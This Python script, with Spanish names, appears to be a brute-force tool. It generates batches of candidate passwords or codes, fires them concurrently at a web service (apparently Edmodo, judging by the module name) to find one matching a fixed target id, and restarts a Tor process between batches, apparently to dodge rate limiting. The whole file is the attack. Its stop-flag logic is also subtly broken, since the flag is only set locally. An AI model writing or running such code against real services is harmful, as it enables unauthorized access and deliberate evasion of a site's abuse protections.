import edmodbrt as eb
import asyncio
import aiohttp
import subprocess

from timer import timer

lstErr = []
bandera = False

async def solicitar(session, url):
    async with session.get(url, headers=eb.cabezera) as response:
        if response.status == 200:
            contenido = await response.json()
            if contenido['id'] == 37317025:
                print("Codigo encontrado: " + url)
                bandera = True
        elif response.status == 429:
            lstErr.append(url)


async def realizar_tareas(lista, numTareas):
    async with aiohttp.ClientSession() as session:
        tareas = [solicitar(session, lista[i]) for i in range(numTareas)]
        await asyncio.gather(*tareas)


@timer(1,1)
def main(valorInicial, numSolic):
    valorDnmc = valorInicial
    contador = numSolic
    longBloqS = 20
    
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    proxyTor = subprocess.Popen("/TorDir-main/Browser/TorBrowser/Tor/tor.exe")

    while longBloqS > 0:
        lista = eb.generar_contrasenia(valorDnmc, longBloqS)
        asyncio.run(realizar_tareas(lista, longBloqS))
        proxyTor = eb.reiniciar_param(proxyTor)
        valorDnmc = eb.sumar_unidadContr(lista[-1])

        if bandera:
            break

        if not (contador - longBloqS) < 0:
            contador -= longBloqS
        else:
            longBloqS = contador
            contador -= longBloqS

    print("Lista de Errores [429] : ")
    print(lstErr)
